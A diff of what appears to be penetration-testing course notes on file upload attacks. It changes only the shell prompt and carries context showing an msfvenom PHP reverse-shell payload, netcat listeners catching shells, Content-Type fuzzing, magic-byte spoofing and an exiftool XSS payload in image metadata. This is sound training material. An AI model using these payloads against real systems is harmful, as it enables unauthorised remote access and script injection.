@@ -219,7 +219,7 @@ Next, we can start a `netcat` listener on our machine (with the above port), upl
 &#x20; Upload Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp OUR_PORT
+root@htb[/htb]$ nc -lvnp OUR_PORT
 listening on [any] OUR_PORT ...
 connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
 # id
@@ -239,7 +239,7 @@ This is why it is always better to use core web framework functions to connect t
 &#x20; Upload Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+root@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
 ...SNIP...
 Payload size: 3033 bytes
 ```
@@ -249,7 +249,7 @@ Once our `reverse.php` script is generated, we can once again start a `netcat` l
 &#x20; Upload Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp OUR_PORT
+root@htb[/htb]$ nc -lvnp OUR_PORT
 listening on [any] OUR_PORT ...
 connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
 # id
@@ -640,8 +640,8 @@ We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wor
 &#x20; Type Filters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
-AbdulrahmanTamim@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt
+root@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
+root@htb[/htb]$ cat content-type.txt | grep 'image/' > image-content-types.txt
 ```
 
 Exercise: Try to run the above scan to find what Content-Types are allowed.
@@ -671,8 +671,8 @@ Let's take a basic example to demonstrate this. The `file` command on Unix syste
 &#x20; Type Filters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo "this is a text file" > text.jpg 
-AbdulrahmanTamim@htb[/htb]$ file text.jpg 
+root@htb[/htb]$ echo "this is a text file" > text.jpg 
+root@htb[/htb]$ file text.jpg 
 text.jpg: ASCII text
 ```
 
@@ -681,8 +681,8 @@ As we see, the file's MIME type is `ASCII text`, even though its extension is `.
 &#x20; Type Filters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo "GIF8" > text.jpg 
-AbdulrahmanTamim@htb[/htb]$file text.jpg
+root@htb[/htb]$ echo "GIF8" > text.jpg 
+root@htb[/htb]$file text.jpg
 text.jpg: GIF image data
 ```
 
@@ -742,8 +742,8 @@ Another example of XSS attacks is web applications that display an image's metad
 &#x20; Limited File Uploads
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
-AbdulrahmanTamim@htb[/htb]$ exiftool HTB.jpg
+root@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+root@htb[/htb]$ exiftool HTB.jpg
 ...SNIP...
 Comment                         :  "><img src=1 onerror=alert(window.origin)>
 ```
